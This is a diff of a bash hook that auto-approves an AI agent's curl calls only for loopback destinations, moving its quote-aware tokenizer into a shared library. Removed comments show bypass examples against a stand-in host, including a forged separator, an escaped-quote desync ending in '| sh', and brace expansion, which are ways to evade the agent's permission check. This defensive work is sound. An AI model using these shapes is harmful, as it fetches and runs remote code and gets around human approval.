@@ -52,12 +52,9 @@
 # `http://localhost:3000/`. Unlike the two residuals above, which bound side
 # effects beyond the destination check, a glob breaks the destination check
 # itself, so it gets no residual.
+# classify_segment とその呼び先は shell_reader_each_segment が名前で間接的に呼ぶ。
+# shellcheck disable=SC2329
 set -euo pipefail
-
-# The tokenizer marks command separators with a byte no command writes on
-# purpose. It is declared here because the readability checks below have to
-# refuse it in the input before the walk can rely on it being its own.
-SEP=$'\x01'
 
 emit_allow() {
     printf '%s\n' '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"curl-localhost-guard: 宛先がすべてループバック(localhost / 127.0.0.0/8 / [::1])なので承認不要で実行します。"}}'
@@ -73,25 +70,6 @@ COMMAND=$(printf '%s' "$STDIN_JSON" | jq -r '.tool_input.command // empty' 2>/de
 case "$COMMAND" in
 *curl*) ;;
 *) exit 0 ;;
-esac
-
-# The walk below is quadratic in the length of the command, and `matcher:
-# "Bash"` runs this hook for every Bash call — including ones that merely
-# mention curl in a long quoted body (`gh pr create --body …`, and the PR
-# describing this very hook is that shape). An over-long command is also just
-# another command that cannot be read cheaply, so it takes the same exit as any
-# other unreadable one.
-[[ ${#COMMAND} -gt 8192 ]] && exit 0
-
-# A variable or a command substitution can carry the real target, and an
-# assignment prefix can set `http_proxy` and redirect an otherwise-loopback URL
-# off the machine. Neither is readable here, so neither is allowed. The SEP
-# sentinel is refused for a different reason: written literally in the command
-# it would forge a segment boundary the shell does not have, so `curl URL <SEP>
-# echo https://evil.example/` would read as an inert `echo` segment while bash
-# passes the remote URL to curl.
-case "$COMMAND" in
-*'$'* | *'`'* | *"$SEP"*) exit 0 ;;
 esac
 
 # curl reads a curlrc before it looks at any argument, and one `proxy = …` line
@@ -111,181 +89,18 @@ for rc in "${CURL_HOME:-}/.curlrc" "${XDG_CONFIG_HOME:-}/curlrc" "${HOME:-}/.cur
     fi
 done
 
-# --- tokenizer ---------------------------------------------------------------
+# --- reader ------------------------------------------------------------------
 
-# `read -ra` splits on whitespace only, which is wrong here in both directions:
-# `-H "Accept: application/json"` becomes two tokens (and the second is then read
-# as a URL), while `-d '{"a":"x|y"}'` would have its `|` treated as a pipe. The
-# argument that matters — the URL — sits among quoted neighbours, so the scan
-# needs real quote handling.
-#
-# Substitutions were already refused above, so a quote-aware walk is a faithful
-# reading of the command here: nothing inside the quotes can still expand.
-#
-# Emits into the TOKENS array. Command separators (`;` `&` `|` newline, and the
-# subshell parentheses) become the SEP sentinel; redirections become one
-# operator token with any file-descriptor digit attached, so `2>&1` cannot leave
-# a stray `1` behind for the argument walk to read as a URL.
-TOKENS=()
-
-# Space-delimited indexes into TOKENS whose token carried an unquoted `?` or
-# `[`. Recorded rather than refused outright so the one safe shape — a loopback
-# URL with the glob in its path or query — survives; see
-# `glob_token_is_loopback_safe`. Only `flush` appends a word token, so this is
-# the single site that has to stay in step with TOKENS.
-GLOB_TOKEN_INDEXES=' '
-
-# Set when the walk reads something whose argument count it cannot predict.
-UNREADABLE=0
-
-tokenize() {
-    local s=$1
-    local length=${#s}
-    local index character quote='' current='' started=0 current_glob=0 operator
-
-    flush() {
-        if [[ $started -eq 1 ]]; then
-            if [[ $current_glob -eq 1 ]]; then
-                GLOB_TOKEN_INDEXES+="${#TOKENS[@]} "
-            fi
-            TOKENS+=("$current")
-            current=''
-            started=0
-            current_glob=0
-        fi
-    }
-
-    for ((index = 0; index < length; index++)); do
-        character=${s:index:1}
-
-        if [[ -n "$quote" ]]; then
-            # Inside "..." a backslash still escapes `"` and `\`, and still
-            # continues a line. Treating it as an ordinary character is what
-            # desynchronizes this walk from bash: in `-H "A\"B"` the shell reads
-            # that middle quote as text, but a literal-backslash walk lets it
-            # CLOSE the string — and then the following `"` OPENS one the shell
-            # is not in. From there every space, `|` and `;` is swallowed into a
-            # single token, so `… "A\"B" https://evil.example/ | sh` reads as one
-            # harmless argument. The desync reverses on every second `\"`, so
-            # "the walk only ever splits more than bash" is not a safe intuition.
-            # `\$` and `` \` `` cannot appear: both were refused above.
-            if [[ "$quote" == '"' ]]; then
-                case "$character" in
-                \\)
-                    case "${s:index+1:1}" in
-                    '"' | \\)
-                        index=$((index + 1))
-                        current+=${s:index:1}
-                        started=1
-                        continue
-                        ;;
-                    $'\n')
-                        index=$((index + 1))
-                        continue
-                        ;;
-                    esac
-                    ;;
-                esac
-            fi
-            if [[ "$character" == "$quote" ]]; then
-                quote=''
-            else
-                current+=$character
-                started=1
-            fi
-            continue
-        fi
-
-        case "$character" in
-        '{' | '}' | '*')
-            # Expansions that change the argument count after this walk has read
-            # it. Brace expansion needs no filesystem at all
-            # (`-d {x,https://evil.example/}` becomes two words and the second
-            # reaches curl as a URL); `*` expands to every file in the working
-            # directory, so a planted `evil.example` becomes curl's second URL —
-            # and a scheme-less one, which curl fetches over http. Both are the
-            # unquoted forms only, so a JSON body or an `Accept: */*` header in
-            # quotes is untouched.
-            UNREADABLE=1
-            return
-            ;;
-        '?' | '[')
-            # The same pathname expansion as `*`, and just as able to multiply
-            # the word count (`[ab]x` matches both `ax` and `bx`, so a `-H`
-            # value becomes a header plus a second URL). Refusing them outright
-            # would take `…/api?a=1` and the `[::1]` authority with them, so the
-            # token is marked instead and the curl segment walk keeps only the
-            # shape where the literal text already pins a loopback authority —
-            # see `glob_token_is_loopback_safe`.
-            current_glob=1
-            current+=$character
-            started=1
-            ;;
-        "'" | '"')
-            # An empty quoted string is still a token (`-d ''`).
-            quote=$character
-            started=1
-            ;;
-        \\)
-            index=$((index + 1))
-            # A backslash-newline is a line continuation, not an escaped
-            # character: it joins the two halves and contributes nothing.
-            if [[ "${s:index:1}" != $'\n' ]]; then
-                current+=${s:index:1}
-                started=1
-            fi
-            ;;
-        ' ' | $'\t')
-            flush
-            ;;
-        ';' | '|' | $'\n' | '(' | ')')
-            flush
-            TOKENS+=("$SEP")
-            ;;
-        '&')
-            # `&>file` is a redirection, not a separator.
-            if [[ "${s:index+1:1}" == '>' ]]; then
-                flush
-                operator='>'
-                index=$((index + 1))
-                while [[ $((index + 1)) -lt $length && "${s:index+1:1}" =~ [\>\&0-9-] ]]; do
-                    index=$((index + 1))
-                    operator+=${s:index:1}
-                done
-                TOKENS+=("$operator")
-            else
-                flush
-                TOKENS+=("$SEP")
-            fi
-            ;;
-        '>' | '<')
-            # A bare file-descriptor number in front of the operator belongs to
-            # it rather than being an argument of its own.
-            if [[ "$current" =~ ^[0-9]+$ ]]; then
-                operator=$current
-                current=''
-                started=0
-                current_glob=0
-            else
-                flush
-                operator=''
-            fi
-            operator+=$character
-            while [[ $((index + 1)) -lt $length && "${s:index+1:1}" =~ [\>\&0-9-] ]]; do
-                index=$((index + 1))
-                operator+=${s:index:1}
-            done
-            TOKENS+=("$operator")
-            ;;
-        *)
-            current+=$character
-            started=1
-            ;;
-        esac
-    done
-
-    flush
-}
+# 引用符を解釈して token に分ける reader は他のフックと共有している。読めなかった
+# 理由は flag で返るだけで、扱いはここ(下の segment walk の直前)で決める。
+# 読み込みに失敗したら判定なしで抜ける(ask ルールが決める)。
+# `source` は存在しないファイルで `|| exit 0` に届く前に bash 自身が終了する
+# (bash 3.2 で実測、終了コード 1)ので、先に読めることを確かめる。
+reader_library="$(dirname "${BASH_SOURCE[0]}")/lib/shell-reader.bash"
+[[ -r "$reader_library" ]] || exit 0
+# shellcheck source-path=SCRIPTDIR
+# shellcheck source=lib/shell-reader.bash
+source "$reader_library" || exit 0
 
 # --- host classification -----------------------------------------------------
 
@@ -539,20 +354,11 @@ INERT_COMMANDS='jq head tail cat wc grep egrep fgrep sort uniq tr cut column ech
 # --- segment walk ------------------------------------------------------------
 
 SAW_CURL=0
-SEGMENT=()
-# Index in TOKENS of SEGMENT[0]. A segment never contains a SEP, so SEGMENT[i]
-# is TOKENS[SEGMENT_START + i] and the glob marks recorded against TOKENS
-# indexes can be read back without a second parallel array.
-SEGMENT_START=0
 
-# Classify the segment accumulated so far. Returns non-zero when the whole
-# command must keep its prompt.
+# 1 segment を分類する。コマンド全体をプロンプトに残すべきときは非 0。
+# reader が segment ごとに呼ぶ(引数が segment の token)。
 classify_segment() {
-    local binary index
-    # bash 3.2 rejects expanding an empty array under `set -u`, so the count is
-    # checked before the array is touched.
-    [[ ${#SEGMENT[@]} -eq 0 ]] && return 0
-    binary=${SEGMENT[0]}
+    local segment=("$@") binary=$1 index
 
     # No prefix skipping. `VAR=value curl …` can set http_proxy, and `env` /
     # `sudo` can do the same, so an unrecognized leading word is a prompt rather
@@ -564,14 +370,14 @@ classify_segment() {
     if [[ "$binary" == "curl" ]]; then
         # Glob marks only matter here: an inert segment's arguments are never
         # read as destinations, so `jq .[0]` needs no prompt.
-        for ((index = 1; index < ${#SEGMENT[@]}; index++)); do
-            case "$GLOB_TOKEN_INDEXES" in
-            *" $((SEGMENT_START + index)) "*)
-                glob_token_is_loopback_safe "${SEGMENT[$index]}" || return 1
+        for ((index = 1; index < ${#segment[@]}; index++)); do
+            case "$SHELL_READER_GLOB_INDEXES" in
+            *" $((SHELL_READER_SEGMENT_START + index)) "*)
+                glob_token_is_loopback_safe "${segment[$index]}" || return 1
                 ;;
             esac
         done
-        classify_curl "${SEGMENT[@]}" || return 1
+        classify_curl "${segment[@]}" || return 1
         SAW_CURL=1
         return 0
     fi
@@ -580,23 +386,19 @@ classify_segment() {
     return 0
 }
 
-tokenize "$COMMAND"
-[[ $UNREADABLE -eq 1 ]] && exit 0
-[[ ${#TOKENS[@]} -eq 0 ]] && exit 0
+shell_reader_read "$COMMAND"
+# 変数・置換は宛先を運べる(代入の前置は `http_proxy` で URL を外へ振り替えられる)、
+# 番兵は偽の segment 境界を作れる、{ } * は単語数を変える、長すぎる入力は安く読めない。
+# どれも読み切れないコマンドとして ask に任せる。詳細は lib/shell-reader.bash。
+# 引用符の閉じ忘れはここでは見ない(元の走査も見ておらず、閉じていない token は
+# URL として読めずにプロンプトへ落ちる)。
+if [[ $SHELL_READER_TOO_LONG -eq 1 || $SHELL_READER_EXPANSION -eq 1 ||
+    $SHELL_READER_SEP_IN_INPUT -eq 1 || $SHELL_READER_WORD_MULTIPLIER -eq 1 ]]; then
+    exit 0
+fi
+[[ ${#SHELL_READER_TOKENS[@]} -eq 0 ]] && exit 0
 
-position=0
-while [[ $position -lt ${#TOKENS[@]} ]]; do
-    if [[ "${TOKENS[$position]}" == "$SEP" ]]; then
-        classify_segment || exit 0
-        SEGMENT=()
-        SEGMENT_START=$((position + 1))
-    else
-        SEGMENT+=("${TOKENS[$position]}")
-    fi
-    position=$((position + 1))
-done
-classify_segment || exit 0
-
+shell_reader_each_segment classify_segment || exit 0
 [[ $SAW_CURL -eq 1 ]] || exit 0
 
 emit_allow
